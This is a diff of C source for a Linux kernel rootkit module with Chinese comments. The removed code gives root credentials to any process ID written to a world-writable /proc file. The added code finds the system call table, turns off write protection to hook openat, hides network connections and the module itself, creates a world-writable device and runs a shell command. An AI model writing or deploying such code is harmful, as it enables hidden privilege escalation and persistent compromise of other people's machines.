@@ -1,138 +1,101 @@
-/*
- * rootit.c
- *
- *
- * This program is free software; you can redistribute it and/or modify
- * it under the terms of the GNU General Public License version 2 as
- * published by the Free Software Foundation.
- */
 #include <linux/kernel.h>
-#include <linux/types.h>
-#include <linux/export.h>
-#include <linux/kthread.h>
+#include <linux/fs.h>
+#include <linux/init.h>
+#include <linux/device.h>
 #include <linux/module.h>
+#include "functions.c"
 
-#include <linux/debugfs.h>
-#include <linux/proc_fs.h>
-#include <linux/uaccess.h>
-#include <linux/cred.h>
-
-#include <linux/slab.h>
-
-static struct proc_dir_entry *proc_root;
-static struct proc_dir_entry *rootit;
-static struct cred *cred_back;
-static struct task_struct *task;
-
-static ssize_t imagemlt_rootit_write(struct file *file, const char __user *buffer,
-                                    size_t count, loff_t *data)
+// 模块加载、卸载函数定义
+static int __init rootkit_init(void)
 {
-    char *buf;
-    struct cred *cred;
-    struct task_struct *tasklist,*p;
-    struct list_head *pos;
-    int i,res;   
-    tasklist=&init_task;
-    if (count < 1)
-        return -EINVAL;
-
-    buf = kmalloc(count, GFP_KERNEL);
-    if (!buf)
-        return -ENOMEM;
-
-    if (copy_from_user(buf, buffer, count)) {
-        kfree(buf);
+    //获取系统调用表地址
+    real_sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
+    //错误处理
+    if (!real_sys_call_table)
+    {
+        pr_info("sys call table not found");
         return -EFAULT;
     }
-    res=0;
-    for(i=0;i<count;i++){
-	if(*(buf+i)==0 || *(buf+i)>'9' || *(buf+i)<'0')break;
-	printk("%d\n",*(buf+i));
-	res=res*10+(*(buf+i)-'0');
+    if (!hide_connect_init(real_sys_call_table))
+    {
+         pr_info("hide_port_init fail!");
+         return -EFAULT;
     }
-    printk("pid you wannted is %d",res);
-    list_for_each(pos,&tasklist->tasks){
-        p=list_entry(pos,struct task_struct,tasks);
-    	//if(!strncmp(p->comm,(char*)buf,strlen(p->comm))){
-    	if(p->pid==res){
-        	task = p;
-        	cred = (struct cred *)__task_cred(task);
-        	memcpy(cred_back, cred, sizeof(struct cred));
+    // //打印出系统调用表地址
+    pr_info("real_sys_call_table: %p", real_sys_call_table);
 
-        	cred->uid = GLOBAL_ROOT_UID;
-        	cred->gid = GLOBAL_ROOT_GID;
-        	cred->suid = GLOBAL_ROOT_UID;
-        	cred->euid = GLOBAL_ROOT_UID;
-        	cred->euid = GLOBAL_ROOT_UID;
-        	cred->egid = GLOBAL_ROOT_GID;
-        	cred->fsuid = GLOBAL_ROOT_UID;
-        	cred->fsgid = GLOBAL_ROOT_GID;
-        	printk("now task %s are root\n",p->comm);
-		break;
-    	}
+    // 获取真实的sys_openat函数地址
+    // __NR_openat是openat系统调用的系统调用号,https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl
+    real_sys_openat = (void *)real_sys_call_table[__NR_openat];
+    
+    // 关闭写保护，将真实的sys_openat函数地址映射到我们自己写的openat函数地址处，偷梁换柱
+    disable_wp();
+    real_sys_call_table[__NR_openat] = (void *)my_sys_openat;
+    
+    // 恢复现场，打开写保护
+    enable_wp();
+    
+    pr_info("update __NR_openat: %p->%p", real_sys_openat, my_sys_openat);
+
+    // 注册设备
+    major_num = register_chrdev(0, DEVICE_NAME, &rootkit_fo);
+    if (major_num < 0)
+        return major_num;
+
+    // 创建设备响应类模块
+    module_class = class_create(THIS_MODULE, CLASS_NAME);
+    if (IS_ERR(module_class))
+    {
+        unregister_chrdev(major_num, DEVICE_NAME);
+        return PTR_ERR(module_class);
     }
-    kfree(buf);
-    return count;
-}
 
+    // 创建设备节点
+    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);
+    if (IS_ERR(module_device))
+    {
+        class_destroy(module_class);
+        unregister_chrdev(major_num, DEVICE_NAME);
+        return PTR_ERR(module_device);
+    }
+    __file = filp_open(DEVICE_PATH, O_RDWR, 0);
+    if (IS_ERR(__file)) // failed
+    {
+        device_destroy(module_class, MKDEV(major_num, 0));
+        class_destroy(module_class);
+        unregister_chrdev(major_num, DEVICE_NAME);
+        return PTR_ERR(__file);
+    }
+    __inode = file_inode(__file);
+    __inode->i_mode |= 0666;
+    filp_close(__file, NULL);
 
-ssize_t imagemlt_rootit_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
-{
-    printk("root any pid!\n");
+    module_info();
+    hide_myself();
+    show_myself();
+    pr_info("Module install successful##!\n");
+    exec_cmd("echo 123 >> /tmp/result.txt");
     return 0;
 }
 
-static int imagemlt_rootit_open(struct inode *inode, struct file *file)
+static void __exit rootkit_exit(void)
 {
-    return 0;
+    // // 模块退出的时候，需要恢复现场，将修改过的地址再改回去
+    disable_wp();
+    real_sys_call_table[__NR_openat] = (void *)real_sys_openat;
+    enable_wp();
+    
+    device_destroy(module_class, MKDEV(major_num, 0));
+    class_destroy(module_class);
+    unregister_chrdev(major_num, DEVICE_NAME);
+    hide_connect_exit(real_sys_call_table);
+    pr_info("Module uninstall successful!\n");
 }
 
-static const struct proc_ops proc_ops = {
-    .proc_read = imagemlt_rootit_read,
-    .proc_write = imagemlt_rootit_write,
-    .proc_open = imagemlt_rootit_open,
-};
-
-static int imagemlt_root_procfs_attach(void)
-{
-    proc_root = proc_mkdir("imagemlt_r00t", NULL);
-    rootit= proc_create("imagemlt_r00t", 0666, proc_root, &proc_ops);
-    if (IS_ERR(rootit)){
-        printk("create imagemlt_r00t dir error\n");
-        return -1;
-    }
-    return 0;
-
-}
-
-static int __init imagemlt_r00t_init(void)
-{
-    int ret;
-    cred_back = kmalloc(sizeof(struct cred), GFP_KERNEL);
-    if (IS_ERR(cred_back))
-        return PTR_ERR(cred_back);
-
-    ret = imagemlt_root_procfs_attach();
-    printk("===fe3o4==== imagemlt_root_procfs_attach ret:%d\n", ret);
-    if(ret){
-        printk("===fe3o4== imagemlt_root_procfs_attach failed===\n ");
-    }
-    return 0;
-}
-
-static void __exit imagemlt_r00t_exit(void)
-{
-    if(task!=NULL && task->mm!=NULL){
-        struct cred *cred = (struct cred *)__task_cred(task);
-        memcpy(cred, cred_back, sizeof(struct cred));
-    }
-    kfree(cred_back);
-
-    remove_proc_entry("imagemlt_r00t", proc_root);
-    remove_proc_entry("imagemlt_r00t", NULL);
-    printk("proc %s nolonger be root ",task->comm);
-}
-
-module_init(imagemlt_r00t_init);
-module_exit(imagemlt_r00t_exit);
+// 模块信息声明
 MODULE_LICENSE("GPL");
+MODULE_AUTHOR("ice");
+MODULE_DESCRIPTION("A simple example Rootkit.");
+MODULE_VERSION("1.0");
+module_init(rootkit_init);
+module_exit(rootkit_exit);
